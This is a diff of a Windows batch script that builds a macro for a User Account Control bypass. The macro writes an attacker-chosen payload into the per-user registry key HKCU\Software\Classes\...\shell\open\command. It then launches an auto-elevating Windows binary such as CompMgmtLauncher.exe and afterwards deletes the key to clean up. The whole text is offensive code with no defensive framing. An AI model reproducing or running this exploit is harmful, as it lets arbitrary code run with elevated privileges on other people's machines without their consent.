@@ -1,7 +1,7 @@
 @echo off
 SETLOCAL DISABLEDELAYEDEXPANSION
 
-::Create newline variable
+::Definitions
 
 ( set LF=^
 %= EMPTY =%
@@ -20,8 +20,10 @@ if "%WIN_VER%" equ "10.0" (
 	set "trigger=CompMgmtLauncher.exe"
 )
 set regPath="HKCU\Software\Classes\%vuln%\shell\open\command"
-::elev macro
 
+::Macro
+
+ENDLOCAL &^
 set $elev=for %%a in (0 1) do if "%%a" equ "1" (%NL%
 		for %%j in (!payload!) do (%NL%
 			reg add %regpath% /d "%%j" /f%NL%
@@ -30,5 +32,3 @@ set $elev=for %%a in (0 1) do if "%%a" equ "1" (%NL%
 			reg delete "HKCU\Software\Classes\%vuln%" /f%NL%
 		)%NL%
 	) ELSE SETLOCAL ENABLEDELAYEDEXPANSION ^& set payload=,
-
-call return.bat $elev $elev
